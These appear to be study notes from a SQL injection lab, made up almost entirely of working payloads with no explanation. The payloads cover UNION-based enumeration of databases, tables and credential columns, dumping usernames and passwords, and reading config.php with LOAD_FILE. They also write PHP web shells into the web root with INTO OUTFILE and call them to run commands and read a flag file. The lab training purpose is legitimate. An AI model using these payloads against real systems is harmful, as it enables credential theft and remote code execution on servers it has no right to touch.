#sqlinjection
```
mysql -u root -h 139.59.177.61 -P 32303 -p
show databases;
use employees;
show tables;
select * from departments;
```

---

```
SELECT * FROM logins ORDER BY password;
SELECT * FROM logins ORDER BY password DESC;
SELECT * FROM logins ORDER BY password DESC, id ASC;
SELECT * FROM logins LIMIT 2;
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins where username = 'admin';
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins WHERE username LIKE 'admin%';
```

---

```sql
SELECT * FROM employees WHERE first_name LIKE 'Bar%' AND hire_date = '1990-01-01';
```

---

```sql
SELECT * FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%Engineer%';
```

---

```
' OR id = 5)#
```

---

```sql
SELECT emp_no,1 FROM employees UNION SELECT * FROM departments;
SELECT emp_no,birth_date FROM employees UNION SELECT * FROM departments;
```

---

```sql
cn' UNION select 1,@@version,3,4-- -
cn' UNION select 1,user(),3,4-- -
```

---

```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

---

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
cn' UNION select 1, username, password, 4 from ilfreight.users-- -
```

---

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

---

```sql
SHOW VARIABLES LIKE 'secure_file_priv';

SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
cat /tmp/credentials 
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

---

```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
http://159.65.92.13:32376/shell.php?0=id
http://159.65.92.13:32376/shell.php?0=cat%20../flag.txt
```

---

```sql
admin' or '1'='1'#
' UNION SELECT 1,LOWER('DIMAS'),2,3,4;#

' UNION SELECT 1, user(), 3, 4, 5-- -

' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user WHERE user="root"-- -

' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

' UNION SELECT 1, grantee, privilege_type, is_grantable, 5 FROM information_schema.user_privileges-- -

' union select "",'<?php system($_GET["cmd"]); ?>', "", "","" into outfile '/var/www/html/dashboard/shell.php'-- -

' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboard/shell.php"), 3, 4, 5-- -

http://159.65.58.189:31617/dashboard/shell4.php?cmd=ls%20/

